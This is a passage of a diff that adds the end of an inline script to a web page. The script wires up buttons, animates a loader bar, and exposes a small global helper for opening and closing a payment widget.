+        document.addEventListener('DOMContentLoaded', wireButtons);
+    } else {
+        wireButtons();
+    }
+
+    /* loader bar */
+    document.addEventListener('DOMContentLoaded', function(){
+        var loader = document.querySelector('.PyIBB');
+        if(loader){
+            loader.style.opacity = '1';
+            setTimeout(function(){ loader.style.opacity = '0'; }, 800);
+        }
+    });
+
+    /* global API */
+    window.mainApp = {
+        payment: {
+            open:  function(){ var w=document.querySelector('payment-widget'); if(w) w.open(); },
+            close: function(){ var w=document.querySelector('payment-widget'); if(w) w.close(); },
+            get isOpen(){ var w=document.querySelector('payment-widget'); return w?w.isOpen:false; }
+        }
+    };
+})();
+</script>
 </body>
 </html>
